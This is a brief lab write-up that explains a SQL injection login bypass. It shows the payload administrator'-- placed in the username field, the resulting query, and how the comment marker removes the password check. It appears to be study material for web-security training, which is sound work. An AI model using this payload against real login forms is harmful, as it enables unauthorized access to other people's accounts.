# Lab 2: SQL injection vulnerability allowing login bypass


Original Query:

SELECT * FROM users
WHERE username='USER' AND password='PASS'


Payload in username:

administrator'--


The query becomes:

SELECT * FROM users
WHERE username='administrator'--' AND password='PASS'


Why does it work?

1. '       → Closes the username string.
2. --      → Comments out the rest of the SQL query.
3. password → The password check is ignored.


Result:

username = administrator
password check = ignored -> Login as administrator
